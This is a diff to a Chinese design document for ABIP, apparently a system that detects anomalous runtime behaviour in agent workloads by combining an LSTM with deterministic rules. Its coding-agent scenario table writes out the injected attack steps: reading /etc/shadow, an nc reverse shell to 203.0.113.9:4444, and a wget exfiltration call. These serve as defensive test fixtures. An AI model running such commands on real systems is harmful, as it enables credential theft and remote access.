@@ -23,9 +23,12 @@ ABIP 的核心命题是:**工作负载的运行时行为是可学习的,偏离�
    - 学习层:LSTM 下一事件预测的惊讶度 `-log P(actual)`,捕捉**事件类别层面**的意外
      (如 coding agent 突然派生 nc 外联)。
    - 确定性层:Risk Context 标记(sensitive_resource / external_destination /
-     capability_change),捕捉**资源层面**的异常(读 /etc/shadow 在类别上仍是普通
-     file_open,惊讶度无效,必须靠规则)。
+     capability_change / unknown_binary),捕捉**资源与身份层面**的异常
+     (读 /etc/shadow 在类别上仍是普通 file_open,惊讶度无效,必须靠规则;
+     类别头区分不了 nc 与 ls 的 exec——都是 process_exec——profile 外的未知二进制
+     由 unknown_binary 标记)。
    两层互补,缺一不可;确定性规则永远优先于模型判断。
+   注意:/etc/passwd 是 world-readable 的配置,**不是**敏感资源(ops 场景的误报对照)。
 
 3. **场景即夹具,验证即度量。** 每个场景有明确的基线脚本与攻击注入点,攻击步骤有
    ground truth 签名。验收不是"看起来能检测",而是可复现的数字:基线 Top-k、
@@ -56,7 +59,7 @@ pod 标签 `abip.io/observe=true` + `abip.io/scenario=<name>`,TracingPolicy 按�
 |---|---|
 | 基线 | 写/读 /workspace/src 源码 → sh 子进程 ls → cp 构建产物到 /tmp → tar 打包 → wget 内部包镜像(10.96.0.1) |
 | 攻击 | ① cat /etc/shadow(凭据窃取)② sh→nc 203.0.113.9:4444(反弹 shell 链)③ wget http://203.0.113.9/exfil(外传) |
-| 预期检测 | ①③ Risk Context(sensitive / external);② nc 的 process_exec 是类别层意外,LSTM 惊讶度 + 进程树 python/sh→nc 链 |
+| 预期检测 | ①③ Risk Context(sensitive / external);② unknown_binary(nc 不在 profile 词表)+ external;进程树 sh→nc 链由树上下文继承评分 |
 
 ### S2 data-agent(数据分析 Agent)
 
@@ -94,10 +97,12 @@ S3 是关键对照:**同类操作(读 /etc 下文件)因资源敏感度不同而
 |---|---|
 | 事件完整性 | invalid=0;攻击步骤全部被观测到 |
 | 基线学习 | 每场景 Top-3 ≥ 0.80(profile 可学习) |
-| 确定性覆盖 | 攻击签名事件的 Risk Context 覆盖率 = 1.0(nc exec 除外,属类别层) |
-| 类别层检测 | nc process_exec 的异常分 > 基线 p90 |
-| 分离度 | 攻击签名事件平均异常分 > 基线平均异常分 |
+| 两层覆盖 | 每个攻击签名事件至少被一层命中:Risk Context 或 LSTM 惊讶度 > 基线 p90,覆盖率 = 1.0 |
 | 误报对照 | 基线中 /etc/passwd 等 config 读取不被标记 sensitive |
+
+训练/推理对齐:子进程样本前置父进程最近 16 个事件,边界标签 = 子进程首事件
+(训练"父上下文 → 子进程诞生"转移),与推理端的树上下文继承完全一致;
+否则继承评分未经训练、不校准(首轮验证已暴露此问题)。
 
 ## 5. 结果
 
